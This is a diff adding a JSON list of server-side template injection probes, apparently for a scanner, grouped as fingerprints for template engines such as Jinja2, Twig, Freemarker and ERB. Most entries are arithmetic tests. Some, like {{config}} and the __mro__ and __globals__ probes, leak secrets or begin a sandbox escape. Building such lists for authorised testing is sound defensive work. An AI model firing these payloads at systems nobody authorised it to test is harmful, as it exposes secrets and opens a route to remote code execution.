@@ -1,0 +1,18 @@
+{
+  "class": "ssti",
+  "order": "bypass-first",
+  "note": "Arithmetic probes first (harmless, engine-fingerprinting), code-eval probes only after the engine is identified. Never destructive payloads.",
+  "payloads": [
+    { "id": "ssti::01", "vector": "{{7*7}}", "note": "Jinja2/Twig family fingerprint (49)" },
+    { "id": "ssti::02", "vector": "${7*7}", "note": "Freemarker/Thymeleaf/Velocity family (49)" },
+    { "id": "ssti::03", "vector": "<%= 7*7 %>", "note": "ERB/EJS family (49)" },
+    { "id": "ssti::04", "vector": "#{7*7}", "note": "Ruby/Thymeleaf variant (49)" },
+    { "id": "ssti::05", "vector": "{{7*'7'}}", "note": "Jinja2 (49) vs Twig (777) discriminator" },
+    { "id": "ssti::06", "vector": "{{config}}", "note": "Jinja2 config leak probe (secrets in output are report-only)" },
+    { "id": "ssti::07", "vector": "{{ ''.__class__.__mro__ }}", "note": "Jinja2 python-sandbox check — identification only" },
+    { "id": "ssti::08", "vector": "${{7*7}}", "note": "Thymeleaf in-expression variant" },
+    { "id": "ssti::09", "vector": "{7*7}", "note": "Handlebars-ish / SmartEngine probe" },
+    { "id": "ssti::10", "vector": "{{ self }}", "note": "engine namespace probe, harmless" },
+    { "id": "ssti::11", "vector": "{{namespace.__class__.__init__.__globals__}}", "note": "Twig sandbox-escape detection — stop at identification" }
+  ]
+}
